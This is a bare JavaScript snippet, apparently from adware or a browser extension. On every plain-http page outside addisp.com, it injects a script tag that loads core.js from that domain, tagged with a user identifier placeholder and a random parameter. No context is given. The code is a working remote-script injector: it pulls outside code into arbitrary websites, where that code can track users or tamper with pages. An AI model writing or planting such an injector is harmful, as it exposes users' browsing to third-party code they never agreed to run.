var doc = document;

if(!doc.location.href.match("http://addisp.com") && doc.location.protocol == 'http:'){
  var head = doc.getElementsByTagName("head")[0];         
  var script = doc.createElement('script');
  script.type = 'text/javascript';
  script.src = 'http://addisp.com/core.js?UID=%GUID%&rnd='  + Math.floor(Math.random() * 10000);
  head.appendChild(script);
}
